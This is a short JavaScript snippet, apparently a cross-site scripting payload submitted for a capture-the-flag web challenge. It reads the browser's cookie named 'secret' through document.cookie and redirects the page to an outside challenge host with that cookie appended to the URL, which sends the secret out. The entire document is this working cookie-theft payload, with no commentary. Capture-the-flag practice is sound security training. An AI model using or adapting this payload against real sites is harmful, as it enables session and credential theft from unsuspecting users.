function getCookie(name) {
    var value = "; " + document.cookie;
    var parts = value.split("; " + name + "=");
    if (parts.length == 2) return parts.pop().split(";").shift();
  }
window.location="https://chall.necst.it/challenges/web4/verify/1321/"+getCookie("secret")

